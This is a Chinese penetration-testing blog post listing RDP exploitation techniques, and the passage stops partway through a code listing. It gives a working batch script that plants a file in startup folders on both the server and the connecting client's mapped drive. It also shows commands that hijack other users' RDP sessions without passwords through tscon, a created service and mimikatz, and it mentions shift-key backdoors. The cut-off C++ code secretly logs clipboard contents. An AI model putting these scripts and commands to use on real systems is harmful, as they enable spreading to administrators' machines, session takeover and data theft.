---
title: rdp利用技巧总结 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18187755
source: 博客园 - 渗透测试中心
date: 2024-05-13
fetch_date: 2025-10-06T17:14:58.988084
---

# rdp利用技巧总结 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [rdp利用技巧总结](https://www.cnblogs.com/backlion/p/18187755 "发布于 2024-05-12 13:51")

近期在项目中管理员在rdp挂载之后搞掉了管理员，想着有时间就整理下针对rdp的利用方法。
[![RDP利用总结](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135047196-1604297009.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/RDP%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.png "RDP利用总结")

针对挂盘的利用方法

复制文件

这个不多说，可以根据的不同的挂盘来决定是拖文件还是放启动项。

有一些自动文件监控和拷贝的应用,如：<https://github.com/cnucky/DarkGuardian>

> DarkGuardian是一款用于监控RDP登录后TSCLIENT(挂盘)的工具,工具后台运行时可自动获取挂盘的文件列表,下载指定文件,拷贝木马文件到挂载硬盘的启动项等功能

[![20201214123213](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135047948-821425645.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214123213.png "20201214123213")

### RDPInception

这种方法相对鸡肋一点，原理就是利用bat脚本放到server启动项/winlogon执行脚本处，等待管理员挂盘后重启执行命令。

```
@echo off

echo Updating Windows ...

@echo off
timeout 1 >nul 2>&1

mkdir \\tsclient\c\temp >nul 2>&1
mkdir C:\temp >nul 2>&1

copy run.bat C:\temp >nul 2>&1
copy run.bat \\tsclient\c\temp >nul 2>&1

del /q %TEMP%\temp_00.txt >nul 2>&1

set dirs=dir /a:d /b /s C:\users\*Startup*
set dirs2=dir /a:d /b /s \\tsclient\c\users\*startup*

echo|%dirs%|findstr /i "Microsoft\Windows\Start Menu\Programs\Startup">>"%TEMP%\temp_00.txt"
echo|%dirs2%|findstr /i "Microsoft\Windows\Start Menu\Programs\Startup">>"%TEMP%\temp_00.txt"

for /F "tokens=*" %%a in (%TEMP%\temp_00.txt) DO (
    copy run.bat "%%a" >nul 2>&1
    copy C:\temp\run.bat "%%a" >nul 2>&1
    copy \\tsclient\c\temp\run.bat "%%a" >nul 2>&1
)

del /q %TEMP%\temp_00.txt >nul 2>&1

REM if "WINDOMAIN"="%USERDOMAIN%"( cmd.exe /c calc.exe )
```

## RDP Session Hijacking

实用的命令是tscon，正常使用是通过密码切换到不同的session。但是在system下是可以不用密码切换不同的用户session。将某一session切换到不同的会话。
这个技巧主要是针对win7及以上环境，整体应用场景为：在2012以上版本windows默认不保存明文的情况下可以切换到目标主机，或者在域中当前用户是本地用户，可以切换到域用户权限。
先在本地使用psexec提到system。(这里可以自己手动创建系统服务来实现。)，还可以配合shift/Utilman后门来进行无密码登录桌面。

### 1、psexec

[![20201214130520](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135048461-1177157727.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214130520.png "20201214130520")

```
C:\Windows\system32>quser
 用户名                会话名             ID  状态    空闲时间   登录时间
>administrator         rdp-tcp#1           1  运行中          .  2020/12/14 11:14
 test                  rdp-tcp#0           2  运行中       1:02  2020/12/14 13:04
C:\Windows\system32>tscon 2 rdp-tcp#1
```

[![20201214141422](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135049115-1755158801.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214141422.png "20201214141422")

### 2、服务项

```
quser
sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1"
net start sesshijack
```

[![20201214142146](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135049876-1975518064.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214142146.png "20201214142146")

[![20201214142235](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135050528-834729231.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214142235.png "20201214142235")

### 3、mimikatz

```
privilege::debug
ts::sessions
toekn::elevate
ts::remote /id:2
```

[![20201214143542](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135051110-1373970676.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214143542.png "20201214143542")
[![20201214143555](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135051706-438862854.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214143555.png "20201214143555")

### 4、shift无密码劫持

在webshell中com劫持shift后门
[![20201214143759](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135052324-162339626.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214143759.png "20201214143759")

[![20201214144009](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135052891-1417876962.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214144009.png "20201214144009")

[![20201214144020](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512135053480-1145457993.png)](https://myblogimages.oss-cn-beijing.aliyuncs.com//img/rdp%E5%88%A9%E7%94%A8%E6%95%B4%E7%90%86/20201214144020.png "20201214144020")

## rdpclip.exe利用

RDP服务可以复制粘贴文本和文件。主要是通过这个rdpclip.exe进程来实现。想要了解具体复制中的操作可以通过ClipSpy来查看剪切板的变化。

在ATT&CK中看到很多披露的利用手法是获取copy的文本内容，还有去年https://research.checkpoint.com/2019/reverse-rdp-attack-code-execution-on-rdp-clients/中给出的一个思路HOOK RDPClip.exe

### 1、剪切板监控

每隔10秒钟，读取一次剪切板内容保存本地。

```
#include <exception>
#include <iostream>
#include <ostream>
#include <stdexcept>
#include <string>
#include <windows.h>
#include <fstream>

using namespace std;

class RaiiClipboard
{
public:
    RaiiClipboard()
    {
        if (!OpenClipboard(NULL))
            throw runtime_error("Can't open clipboard.");
        // ... or define some custom exception class for clipboard errors.
    }

    ~RaiiClipboard()
    {
        CloseClipboard();
    }

    // Ban copy
private:
    RaiiClipboard(const RaiiClipboard&);
    RaiiClipboard& operator=(const RaiiClipboard&);
};

class RaiiTextGlobalLock
{
public:
    explicit RaiiTextGlobalLock(HANDLE hData)
        : m_hData(hData)
    {
        m_psz = static_cast<const char*>(GlobalLock(m_hData));
        if (!m_psz)
            throw runtime_error("Can't acquire lock on clipboard text.");
    }

    ~RaiiTextGlobalLock()
    {
        GlobalUnlock(m_hData);
    }

    const char* Get() const
    {
        return m_psz;
    }

private:
    HANDLE m_hData;
    const char* m_psz;

    // Ban copy
    RaiiTextGlobalLock(const RaiiTextGlobalLock&);
    RaiiTextGlobalLock& operator=(...